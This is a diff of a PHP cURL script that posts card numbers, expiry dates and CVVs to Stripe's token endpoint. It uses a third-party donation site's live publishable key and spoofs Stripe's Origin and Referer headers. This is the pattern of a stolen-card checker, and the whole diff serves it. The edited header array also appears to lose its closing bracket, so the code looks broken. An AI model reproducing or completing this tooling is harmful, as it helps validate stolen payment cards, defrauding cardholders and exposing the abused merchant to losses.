@@ -75,22 +75,19 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'accept: ', 
-'accept-language: ',
-'accept-encoding: ',
-'content-type: ',
-'origin:       ',
-'referer:      ',
-'sec-fetch-mode: cors',
-'sec-fetch-site: same-site'));
-//'user-agent: #'));
+'Host: api.stripe.com',
+'Accept: application/json', 
+'Accept-language:en-US',
+'Content-type: application/x-www-form-urlencoded',
+'Origin: https://js.stripe.com',
+'Referer: https://js.stripe.com/v3/controller-0a6615673ee480df51cb68d035c589d3.html',
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, ' your post feild here  ');
+curl_setopt($ch, CURLOPT_POSTFIELDS, ' email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fportland.scrapcreativereuse.org%2Fdonate%2Fitems-we-accept%2F%3Futm_content%3Dbuffere282f%26utm_medium%3Dsocial%26utm_source%3Dplus.google.com%26utm_campaign%3Dbuffer&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&time_on_page=18416&guid=17583cc9-7646-4f73-ba1a-408931871912&muid=26777036-c852-418d-a6c5-64766e94ff66&sid=9191f10d-8219-4a97-b63d-a25d04ab4a86&key=pk_live_ckPnmJJZTFKgKGv6RihxsV8g');
 //// add headers if site have more
 $result = curl_exec($ch);
 // $token = trim(strip_tags(getStr($result,'"id": "','"')));
